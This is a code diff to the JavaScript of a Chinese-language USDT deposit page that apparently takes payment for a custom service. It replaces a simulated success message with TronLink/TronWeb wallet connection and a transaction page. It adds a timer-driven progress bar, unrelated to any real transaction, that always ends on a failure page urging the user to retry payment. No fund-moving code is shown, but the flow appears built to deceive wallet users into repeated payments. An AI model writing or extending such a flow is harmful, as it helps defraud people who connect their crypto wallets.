+                    setTimeout(() => {
+                        processStep4();
+                    }, 500);
+                }
+            }, 1000);
+            
+            // 实际的钱包连接逻辑
+            try {
+                const walletDetected = await detectWallet(selectedWallet);
+                
+                if (!walletDetected) {
+                    // 钱包未检测到
+                    setTimeout(() => {
+                        clearInterval(timer);
+                        document.getElementById('progressModal').style.display = 'none';
+                        document.getElementById('walletDetectionModal').style.display = 'flex';
+                    }, 2000);
+                    return;
+                }
+                
+                // 连接成功，继续流程
+                const tronWeb = await initTronWeb(selectedWallet);
+                if (tronWeb) {
+                    transactionData.tronWeb = tronWeb;
+                    transactionData.connected = true;
+                }
+                
+            } catch (error) {
+                console.error('连接钱包失败:', error);
+            }
+        }
+        
+        function processStep4() {
+            const step4 = document.getElementById('step4');
+            const progress4 = document.getElementById('progress4');
+            const countdown4 = document.getElementById('countdown4');
+            
+            step4.classList.add('active');
+            
+            let progress = 90;
+            let countdown = 2;
+            
+            const timer = setInterval(() => {
+                progress += 5; // (100-90)/2 = 5%/秒
+                countdown -= 1;
+                
+                progress4.style.width = `${progress}%`;
+                countdown4.textContent = countdown;
+                
+                if (progress >= 100) {
+                    clearInterval(timer);
+                    step4.classList.remove('active');
+                    step4.classList.add('completed');
+                    
+                    // 5秒后跳转到失败页面
+                    setTimeout(() => {
+                        document.getElementById('progressModal').style.display = 'none';
+                        showFailurePage();
+                    }, 1000);
+                }
+            }, 1000);
+        }
+        
+        // 显示失败页面
+        function showFailurePage() {
+            document.querySelector('.container').style.display = 'none';
+            document.getElementById('failurePage').style.display = 'block';
+        }
+        
+        // 显示交易详情页面
+        function showTransactionPage() {
+            document.querySelector('.container').style.display = 'none';
+            
+            // 更新交易详情
+            const orderNumber = generateOrderNumber();
+            const customerName = document.getElementById('customerName').value;
+            const serviceNames = [];
+            const serviceItems = document.querySelectorAll('.service-info-item .value');
+            
+            serviceItems.forEach(item => {
+                if (item.textContent !== categoryNames[category] && 
+                    !item.textContent.includes('服务分类')) {
+                    serviceNames.push(item.textContent);
+                }
+            });
+            
+            const displayServiceName = serviceNames.length > 0 ? serviceNames[0] : '定制服务';
+            
+            document.getElementById('txOrderNumber').textContent = orderNumber;
+            document.getElementById('txServiceName').textContent = displayServiceName;
+            document.getElementById('txAmount').textContent = `$${depositAmount}`;
+            
+            // 存储交易数据
+            transactionData = {
+                orderNumber: orderNumber,
+                amount: depositAmount,
+                serviceName: displayServiceName,
+                customerName: customerName,
+                walletType: selectedWallet,
+                timestamp: new Date().toISOString()
+            };
+            
+            // 保存到localStorage
+            localStorage.setItem('currentTransaction', JSON.stringify(transactionData));
+            
+            document.getElementById('transactionPage').style.display = 'block';
+        }
+        
+        // ==================== 事件监听器 ====================
+        
         document.addEventListener('DOMContentLoaded', function() {
-            // 先添加页面加载动画
+            // 页面加载动画
             document.body.style.opacity = '0';
             document.body.style.transition = 'opacity 0.8s';
             
@@ -1438,21 +2307,6 @@
                     const newDeposit = parseInt(customAmount);
                     updateDepositDisplay(newDeposit);
                     
-                    // 添加自定义金额的视觉反馈
-                    const customOption = document.querySelector('.custom-amount');
-                    customOption.style.border = '2px solid var(--primary)';
-                    customOption.style.borderRadius = '10px';
-                    customOption.style.padding = '15px';
-                    customOption.style.background = 'rgba(0, 243, 255, 0.05)';
-                    customOption.style.transition = 'all 0.3s';
-                    
-                    setTimeout(() => {
-                        customOption.style.border = '';
-                        customOption.style.background = '';
-                        customOption.style.padding = '';
-                    }, 1500);
-                    
-                    // 显示成功消息
                     showNotification(`已设置自定义定金金额: $${newDeposit}`);
                 } else {
                     showNotification('请输入有效的金额 (100-100000之间)', 'error');
@@ -1465,37 +2319,42 @@
             
             walletOptions.forEach(option => {
                 option.addEventListener('click', function() {
-                    // 移除其他选项的选中状态
                     walletOptions.forEach(opt => opt.classList.remove('selected'));
-                    
-                    // 添加当前选项的选中状态
                     this.classList.add('selected');
-                    
-                    // 获取选中的钱包
                     selectedWallet = this.getAttribute('data-wallet');
-                    
-                    // 启用连接按钮
                     connectWalletBtn.disabled = false;
                     connectWalletBtn.textContent = `连接 ${walletNames[selectedWallet]} 并支付`;
                 });
             });
             
             // 连接钱包并支付
-            connectWalletBtn.addEventListener('click', function() {
+            connectWalletBtn.addEventListener('click', async function() {
                 if (!selectedWallet) {
                     showNotification('请先选择钱包', 'error');
                     return;
                 }
                 
-                // 显示支付处理中
-                connectWalletBtn.disabled = true;
-                connectWalletBtn.innerHTML = '<i class="fas fa-cog fa-spin"></i> 处理支付中...';
+                // 检查表单数据
+                const customerName = document.getElementById('customerName').value;
+                const contactInfo = document.getElementById('contactInfo').value;
                 
-                // 模拟支付处理
-                setTimeout(() => {
-                    // 显示支付成功模态框
-                    showPaymentSuccess();
-                }, 2000);
+                if (!customerName || !contactInfo) {
+                    showNotification('请填写姓名和联系方式', 'error');
+                    return;
+                }
+                
+                // 检测钱包
+                const walletDetected = await detectWallet(selectedWallet);
+                
+                if (walletDetected) {
+                    // 钱包已安装，显示交易详情页面
+                    document.getElementById('walletModal').style.display = 'none';
+                    showTransactionPage();
+                } else {
+                    // 钱包未安装，显示检测失败模态框
+                    document.getElementById('walletModal').style.display = 'none';
+                    document.getElementById('walletDetectionModal').style.display = 'flex';
+                }
             });
             
             // 关闭钱包模态框
@@ -1503,17 +2362,58 @@
                 document.getElementById('walletModal').style.display = 'none';
             });
             
+            // 切换钱包按钮
+            document.getElementById('switchWalletBtn').addEventListener('click', function() {
+                document.getElementById('walletDetectionModal').style.display = 'none';
+                document.getElementById('walletModal').style.display = 'flex';
+            });
+            
+            // 下载钱包按钮
+            document.getElementById('downloadWalletBtn').addEventListener('click', function() {
+                if (selectedWallet && walletUrls[selectedWallet]) {
+                    window.open(walletUrls[selectedWallet], '_blank');
+                } else {
+                    window.open('https://www.tronlink.org/', '_blank');
+                }
+            });
+            
+            // 关闭检测模态框
+            document.getElementById('closeDetectionModal').addEventListener('click', function() {
+                document.getElementById('walletDetectionModal').style.display = 'none';
+            });
+            
+            // 确认支付按钮
+            document.getElementById('confirmPaymentBtn').addEventListener('click', function() {
+                document.getElementById('transactionPage').style.display = 'none';
+                startPaymentProgress();
+            });
+            
+            // 取消支付按钮
+            document.getElementById('cancelPaymentBtn').addEventListener('click', function() {
+                document.getElementById('transactionPage').style.display = 'none';
+                document.querySelector('.container').style.display = 'block';
+                showNotification('支付已取消', 'error');
+            });
+            
+            // 重新尝试支付
+            document.getElementById('retryPaymentBtn').addEventListener('click', function() {
+                document.getElementById('failurePage').style.display = 'none';
+                document.querySelector('.container').style.display = 'block';
+                document.getElementById('walletModal').style.display = 'flex';
+            });
+            
+            // 返回主页
+            document.getElementById('backToHomeBtn').addEventListener('click', function() {
+                window.location.href = 'index.html';
+            });
+            
             // 关闭成功模态框
             document.getElementById('closeModal').addEventListener('click', function() {
                 document.getElementById('successModal').style.display = 'none';
-                // 重置表单
                 document.getElementById('paymentForm').reset();
-                
-                // 显示确认消息
-                showNotification('订单已确认！项目经理将尽快与您联系。');
             });
             
-            // 关闭模态框 (点击背景)
+            // 模态框点击背景关闭
             const modals = document.querySelectorAll('.tech-modal');
             modals.forEach(modal => {
                 modal.addEventListener('click', function(e) {
@@ -1528,95 +2428,6 @@
                 document.body.style.opacity = '1';
             }, 100);
         });
-        
-        // 显示支付成功模态框
-        function showPaymentSuccess() {
-            const customerName = document.getElementById('customerName').value;
-            const serviceNames = [];
-            const serviceItems = document.querySelectorAll('.service-info-item .value');
-            serviceItems.forEach(item => {
-                if (item.textContent !== categoryNames[category] && 
-                    !item.textContent.includes('服务分类') &&
-                    !item.textContent.includes('服务总计')) {
-                    serviceNames.push(item.textContent);
-                }
-            });
-            
-            const displayServiceName = serviceNames.length > 0 ? serviceNames[0] : '定制服务';
-            const categoryName = categoryNames[category] || "机器人定制";
-            
-            // 生成随机订单号
-            const orderNumber = 'QUANTUM' + new Date().getFullYear() + 
-                String(new Date().getMonth() + 1).padStart(2, '0') + 
-                String(new Date().getDate()).padStart(2, '0') + 
-                Math.floor(10000 + Math.random() * 90000);
-            
-            // 更新成功消息
-            document.getElementById('successMessage').textContent = 
-                `尊敬的 ${customerName}，您已成功支付 ${categoryName} - ${displayServiceName} 的定金。`;
-            document.getElementById('orderNumber').textContent = orderNumber;
-            document.getElementById('paidAmount').textContent = '$' + depositAmount;
-            document.getElementById('walletType').textContent = walletNames[selectedWallet] || '未选择';
-            
-            // 计算预计完成时间（根据总价调整）
-            const today = new Date();
-            const estimatedDate = new Date(today);
-            let daysToAdd = 5;
-            
-            if (totalServicePrice >= 5000) {
-                daysToAdd = 14;
-            } else if (totalServicePrice >= 3000) {
-                daysToAdd = 10;
-            } else if (totalServicePrice >= 1500) {
-                daysToAdd = 7;
-            }
-            
-            estimatedDate.setDate(today.getDate() + daysToAdd);
-            const formattedDate = estimatedDate.toLocaleDateString('zh-CN', { month: 'long', day: 'numeric' });
-            document.getElementById('estimatedDate').textContent = formattedDate + ' 前';
-            
-            // 支付方式固定为USDT
-            document.getElementById('paidMethod').textContent = 'USDT (泰达币)';
-            
-            // 关闭钱包模态框，显示成功模态框
-            document.getElementById('walletModal').style.display = 'none';
-            document.getElementById('successModal').style.display = 'flex';
-        }
-        
-        // 显示通知函数
-        function showNotification(message, type = 'success') {
-            // 创建通知元素
-            const notification = document.createElement('div');
-            notification.textContent = message;
-            notification.style.position = 'fixed';
-            notification.style.top = '20px';
-            notification.style.right = '20px';
-            notification.style.padding = '15px 25px';
-            notification.style.background = type === 'error' ? 'rgba(255, 0, 110, 0.9)' : 'rgba(0, 243, 255, 0.9)';
-            notification.style.color = 'white';
-            notification.style.borderRadius = '8px';
-            notification.style.fontFamily = "'Orbitron', sans-serif";
-            notification.style.fontWeight = '600';
-            notification.style.zIndex = '10000';
-            notification.style.boxShadow = '0 5px 15px rgba(0, 0, 0, 0.3)';
-            notification.style.transform = 'translateX(150%)';
-            notification.style.transition = 'transform 0.4s ease';
-            
-            document.body.appendChild(notification);
-            
-            // 显示通知
-            setTimeout(() => {
-                notification.style.transform = 'translateX(0)';
-            }, 10);
-            
-            // 隐藏通知
-            setTimeout(() => {
-                notification.style.transform = 'translateX(150%)';
-                setTimeout(() => {
-                    document.body.removeChild(notification);
-                }, 400);
-            }, 3000);
-        }
         
         // 表单提交
         document.getElementById('paymentForm').addEventListener('submit', function(e) {
